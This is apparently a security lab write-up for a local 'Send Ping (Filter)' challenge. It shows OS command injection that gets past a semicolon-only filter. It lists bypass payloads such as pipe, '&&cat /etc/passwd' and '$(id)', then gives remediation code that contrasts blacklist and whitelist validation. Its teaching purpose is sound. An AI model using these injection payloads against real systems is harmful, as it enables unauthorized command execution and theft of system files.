# Send Ping (Filter)

### Vulnerability : OS Command Injection - Filter Bypass

Challenge Name: Send Ping (Filter)

#### 1. Vulnerability Name & Description

OS Command Injection with Basic Filter Bypass

The application implements basic input filtering to prevent command injection by blocking certain command separators like semicolon (;). However, the filter is incomplete and can be bypassed using alternative command chaining operators. Attackers can use other command separators such as pipe (|), double pipe (||), double ampersand (&&), or newline characters to execute arbitrary commands.

#### 2. Proof of Concept (PoC)

Vulnerable Endpoint: [http://localhost:1337/lab/command-injection/ping-hard/](http://localhost:1337/lab/command-injection/ping-hard/)

Vulnerable Parameter: IP address input field

Payload Used:

`|id`

Attack Steps:

1. Access the Send Ping (Filter) challenge page
2. Application blocks semicolon (;) separator
3. Enter "|id" in the PING input field
4. Click "Ping" button
5. Application's filter doesn't block pipe operator
6. Command executes: ping \[target] | id
7. Output displays: uid=33(www-data) gid=33(www-data) groups=33(www-data)
8. Successfully bypassed the filter using pipe operator

Backend Filtering: The application likely filters only semicolon (;) but misses other command separators.

Alternative Bypass Payloads:

```bash
|id
||id
&&id
`id`
$(id)
%0Aid (URL-encoded newline)
|ls
&&cat /etc/passwd
||whoami
```

#### 3. Impact Analysis

* Complete server compromise despite filtering attempts
* Data exfiltration and sensitive file access
* Credential theft from configuration files
* Privilege escalation possibilities
* Backdoor installation and persistent access
* Denial of Service attacks
* Lateral movement within network
* Database compromise
* False sense of security from incomplete filtering
* Demonstrates ineffectiveness of blacklist-based filtering

#### 4. CVSS 3.1 Score & Vector String

CVSS Base Score: 9.8 (Critical)

Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

#### 5. Risk Rating / Severity

Severity Level: CRITICAL

Even with basic filtering in place, the vulnerability remains critical as attackers can easily bypass incomplete filters using well-known techniques.

#### 6. Remediation / Mitigation Steps

1. Never rely on blacklist-based filtering for security - it's inherently flawed:

`*// Insecure - blacklist approach* $target = str_replace(';', '', $_POST['target']); $output = shell_exec("ping -c 4 " . $target);`

1. Use whitelist validation - only allow specific, safe input patterns:

`*// Secure - whitelist approach* $target = $_POST['target']; if (preg_match('/^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$/', $target)) { $target = escapeshellarg($target); $output = shell_exec("ping -c 4 " . $target); } else { die("Invalid IP address format"); }`

1. Avoid shell execution entirely - use native functions:

`*// Best practice - avoid shell execution* $target = $_POST['target']; if (filter_var($target, FILTER_VALIDATE_IP)) { *// Use native PHP socket or ICMP functions// Or use exec() with array output instead of shell_exec()* exec("ping -c 4 " . escapeshellarg($target), $output); } else { die("Invalid IP address"); }`

1. Implement comprehensive input validation checking for all command injection characters:

* ; & | < > $ \` \ ! # ( ) { } \* ? \~ ^ ' "
* Newline characters (%0A, %0D)
* URL-encoded variations

1. Use parameterized commands where possible
2. Run application with minimal privileges
3. Implement multiple layers of defense (defense in depth)
4. Regular security testing and code reviews

#### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

*   Figure 1: Send Ping (Filter) interface with input field containing "`||id`" payload, showing the filtered version of the ping command that attempts to block certain separators

    Command execution result displaying: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, confirming successful filter bypass using pipe operator (|) and arbitrary command execution
